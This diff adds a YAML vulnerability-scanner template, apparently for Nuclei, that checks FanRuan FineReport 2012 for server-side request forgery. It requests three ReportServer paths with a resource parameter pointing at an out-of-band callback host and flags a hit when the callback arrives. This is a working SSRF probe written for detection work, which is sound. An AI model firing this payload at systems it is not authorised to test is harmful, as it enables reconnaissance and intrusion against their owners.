@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - http
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        path:
+            - /seeyonreport/ReportServer
+            - /ReportServer
+            - /WebReport/ReportServer
+      raw:
+        - |
+          GET {{path}}?op=resource&resource=https://{{interactsh-url}} HTTP/1.1
+          Host: {{BaseURL}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+      stop-at-first-match: true
+id: fanruan-finereport-2012-ssrf
+info:
+    author: XiuXin
+    name: fanruan-finereport-2012-ssrf
+    severity: high
+    tags:
+        - fanruan
+        - finereport2
+        - ssrf
